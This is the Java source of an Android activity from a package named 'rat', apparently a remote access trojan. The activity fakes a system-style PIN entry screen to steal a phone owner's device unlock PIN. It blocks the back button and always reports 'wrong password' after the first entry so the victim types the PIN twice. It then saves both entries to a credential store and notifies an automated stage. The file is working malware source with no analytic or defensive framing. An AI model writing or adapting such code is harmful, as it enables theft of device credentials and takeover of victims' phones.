package com.vendor.rat.activity;

import android.app.Activity;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.os.Bundle;
import android.util.Log;
import android.util.TypedValue;
import android.view.Gravity;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.LinearLayout;
import android.widget.TextView;

import com.vendor.rat.auto.pipeline.stage.LockCredentialStage;
import com.vendor.rat.credential.LockCredentialStore;

/**
 * PIN 采集 Activity — 两次输入确认模式，白色系统风格。
 */
public class LockCredentialPromptActivity extends Activity {

    private static final String TAG = "LockCredentialPrompt";
    private static final int MAX_PIN_LENGTH = 6;

    // 配色 — 白底系统风格
    private static final int BG_COLOR = 0xFFF7F7F7;
    private static final int TEXT_PRIMARY = 0xFF1A1A1A;
    private static final int TEXT_SECONDARY = 0xFF666666;
    private static final int DOT_FILLED = 0xFF1A1A1A;
    private static final int DOT_EMPTY = 0xFFCCCCCC;
    private static final int KEY_BG = Color.WHITE;
    private static final int KEY_TEXT = 0xFF1A1A1A;
    private static final int KEY_PRESSED = 0xFFE8E8E8;
    private static final int DELETE_TEXT = 0xFF1A1A1A;
    private static final int ERROR_COLOR = 0xFFE53935;
    private static final int DIVIDER_COLOR = 0xFFE0E0E0;

    private final StringBuilder pinBuffer = new StringBuilder();
    private final View[] dotViews = new View[MAX_PIN_LENGTH];
    private TextView subtitleView;
    private String firstPin = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setStatusBarColor(BG_COLOR);
        getWindow().setNavigationBarColor(Color.WHITE);
        // 深色状态栏图标
        getWindow().getDecorView().setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR | View.SYSTEM_UI_FLAG_LIGHT_NAVIGATION_BAR);
        setContentView(buildLayout());
    }

    void onDigitClicked(char digit) {
        if (pinBuffer.length() >= MAX_PIN_LENGTH) return;
        pinBuffer.append(digit);
        refreshDots();
        if (pinBuffer.length() == MAX_PIN_LENGTH) {
            getWindow().getDecorView().postDelayed(this::onSubmit, 200);
        }
    }

    void onDeleteClicked() {
        if (pinBuffer.length() == 0) return;
        pinBuffer.deleteCharAt(pinBuffer.length() - 1);
        refreshDots();
    }

    private void onSubmit() {
        if (pinBuffer.length() < MAX_PIN_LENGTH) return;
        String pin = pinBuffer.toString();
        pinBuffer.delete(0, pinBuffer.length());
        refreshDots();

        if (firstPin == null) {
            firstPin = pin;
            setSubtitle("\u5BC6\u7801\u9519\u8BEF\uFF0C\u8BF7\u91CD\u65B0\u8F93\u5165");
            setSubtitleColor(ERROR_COLOR);
        } else {
            if (firstPin.equals(pin)) {
                LockCredentialStore.savePin(pin);
                Log.d(TAG, "Two PINs match, saved one");
            } else {
                LockCredentialStore.savePin(firstPin);
                LockCredentialStore.savePinAlt(pin);
                Log.d(TAG, "Two PINs differ, saved both");
            }
            setResult(RESULT_OK);
            LockCredentialStage.notifyPromptFinished();
            finish();
        }
    }

    @Override public void onBackPressed() { }

    @Override
    protected void onDestroy() {
        LockCredentialStage.notifyPromptFinished();
        super.onDestroy();
    }

    private void setSubtitle(String text) { if (subtitleView != null) subtitleView.setText(text); }
    private void setSubtitleColor(int color) { if (subtitleView != null) subtitleView.setTextColor(color); }

    private void refreshDots() {
        int len = pinBuffer.length();
        for (int i = 0; i < MAX_PIN_LENGTH; i++) {
            GradientDrawable bg = (GradientDrawable) dotViews[i].getBackground();
            bg.setColor(i < len ? DOT_FILLED : Color.TRANSPARENT);
            bg.setStroke(dp(2), i < len ? DOT_FILLED : DOT_EMPTY);
        }
    }

    // ========== Layout ==========

    private View buildLayout() {
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(BG_COLOR);

        // 上半: 标题 + 圆点
        LinearLayout top = new LinearLayout(this);
        top.setOrientation(LinearLayout.VERTICAL);
        top.setGravity(Gravity.CENTER_HORIZONTAL);
        top.setLayoutParams(new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 0, 1f));

        // 标题
        TextView title = makeText("\u8F93\u5165 PIN", 20, TEXT_PRIMARY, true, dp(100), dp(8));
        top.addView(title);

        // 副标题
        subtitleView = makeText(
                "\u8BF7\u8F93\u5165\u60A8\u7684\u8BBE\u5907 PIN \u7801",
                14, TEXT_SECONDARY, false, 0, dp(40));
        top.addView(subtitleView);

        // 圆点
        top.addView(buildDotRow());

        root.addView(top);

        // 分割线
        View divider = new View(this);
        divider.setBackgroundColor(DIVIDER_COLOR);
        divider.setLayoutParams(new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 1));
        root.addView(divider);

        // 下半: 数字键盘 (白底)
        root.addView(buildKeypad());

        return root;
    }

    private LinearLayout buildDotRow() {
        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        row.setGravity(Gravity.CENTER);
        row.setLayoutParams(new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT));
        for (int i = 0; i < MAX_PIN_LENGTH; i++) {
            View dot = new View(this);
            LinearLayout.LayoutParams dlp = new LinearLayout.LayoutParams(dp(12), dp(12));
            dlp.setMargins(dp(12), 0, dp(12), 0);
            dot.setLayoutParams(dlp);
            GradientDrawable bg = new GradientDrawable();
            bg.setShape(GradientDrawable.OVAL);
            bg.setColor(Color.TRANSPARENT);
            bg.setStroke(dp(2), DOT_EMPTY);
            dot.setBackground(bg);
            dotViews[i] = dot;
            row.addView(dot);
        }
        return row;
    }

    private LinearLayout buildKeypad() {
        LinearLayout pad = new LinearLayout(this);
        pad.setOrientation(LinearLayout.VERTICAL);
        pad.setBackgroundColor(Color.WHITE);
        pad.setGravity(Gravity.CENTER_HORIZONTAL);
        pad.setPadding(0, 0, 0, dp(16));

        pad.addView(buildKeyRow('1', '2', '3'));
        pad.addView(keyDivider());
        pad.addView(buildKeyRow('4', '5', '6'));
        pad.addView(keyDivider());
        pad.addView(buildKeyRow('7', '8', '9'));
        pad.addView(keyDivider());
        pad.addView(buildBottomKeyRow());
        return pad;
    }

    private View keyDivider() {
        View d = new View(this);
        d.setBackgroundColor(DIVIDER_COLOR);
        d.setLayoutParams(new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 1));
        return d;
    }

    private LinearLayout buildKeyRow(char c1, char c2, char c3) {
        LinearLayout row = newRow();
        row.addView(makeKey(String.valueOf(c1), null, c1, false));
        row.addView(vertDivider());
        row.addView(makeKey(String.valueOf(c2), null, c2, false));
        row.addView(vertDivider());
        row.addView(makeKey(String.valueOf(c3), null, c3, false));
        return row;
    }

    private LinearLayout buildBottomKeyRow() {
        LinearLayout row = newRow();
        row.addView(makeEmptyCell());
        row.addView(vertDivider());
        row.addView(makeKey("0", null, '0', false));
        row.addView(vertDivider());
        row.addView(makeDeleteCell());
        return row;
    }

    private View vertDivider() {
        View d = new View(this);
        d.setBackgroundColor(DIVIDER_COLOR);
        d.setLayoutParams(new LinearLayout.LayoutParams(1,
                LinearLayout.LayoutParams.MATCH_PARENT));
        return d;
    }

    private LinearLayout newRow() {
        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        row.setGravity(Gravity.CENTER);
        row.setLayoutParams(new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT));
        return row;
    }

    private View makeKey(String label, String sub, final char digit, boolean dummy) {
        LinearLayout cell = new LinearLayout(this);
        cell.setOrientation(LinearLayout.VERTICAL);
        cell.setGravity(Gravity.CENTER);
        cell.setBackgroundColor(KEY_BG);
        cell.setLayoutParams(new LinearLayout.LayoutParams(0, dp(56), 1f));
        cell.setClickable(true);

        TextView num = new TextView(this);
        num.setText(label);
        num.setTextSize(TypedValue.COMPLEX_UNIT_SP, 28);
        num.setTextColor(KEY_TEXT);
        num.setTypeface(Typeface.create("sans-serif-light", Typeface.NORMAL));
        num.setGravity(Gravity.CENTER);
        cell.addView(num);

        cell.setOnClickListener(v -> {
            v.setBackgroundColor(KEY_PRESSED);
            v.postDelayed(() -> v.setBackgroundColor(KEY_BG), 100);
            onDigitClicked(digit);
        });
        return cell;
    }

    private View makeEmptyCell() {
        View cell = new View(this);
        cell.setBackgroundColor(BG_COLOR);
        cell.setLayoutParams(new LinearLayout.LayoutParams(0, dp(56), 1f));
        return cell;
    }

    private View makeDeleteCell() {
        LinearLayout cell = new LinearLayout(this);
        cell.setGravity(Gravity.CENTER);
        cell.setBackgroundColor(KEY_BG);
        cell.setLayoutParams(new LinearLayout.LayoutParams(0, dp(56), 1f));
        cell.setClickable(true);

        TextView del = new TextView(this);
        del.setText("\u232B");
        del.setTextSize(TypedValue.COMPLEX_UNIT_SP, 22);
        del.setTextColor(DELETE_TEXT);
        del.setGravity(Gravity.CENTER);
        cell.addView(del);

        cell.setOnClickListener(v -> {
            v.setBackgroundColor(KEY_PRESSED);
            v.postDelayed(() -> v.setBackgroundColor(KEY_BG), 100);
            onDeleteClicked();
        });
        return cell;
    }

    private TextView makeText(String text, int sp, int color, boolean bold,
                              int topMargin, int bottomMargin) {
        TextView tv = new TextView(this);
        tv.setText(text);
        tv.setTextSize(TypedValue.COMPLEX_UNIT_SP, sp);
        tv.setTextColor(color);
        tv.setGravity(Gravity.CENTER);
        if (bold) tv.setTypeface(Typeface.DEFAULT_BOLD);
        LinearLayout.LayoutParams p = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        p.topMargin = topMargin;
        p.bottomMargin = bottomMargin;
        tv.setLayoutParams(p);
        return tv;
    }

    private int dp(int value) {
        return (int) TypedValue.applyDimension(
                TypedValue.COMPLEX_UNIT_DIP, value,
                getResources().getDisplayMetrics());
    }
}
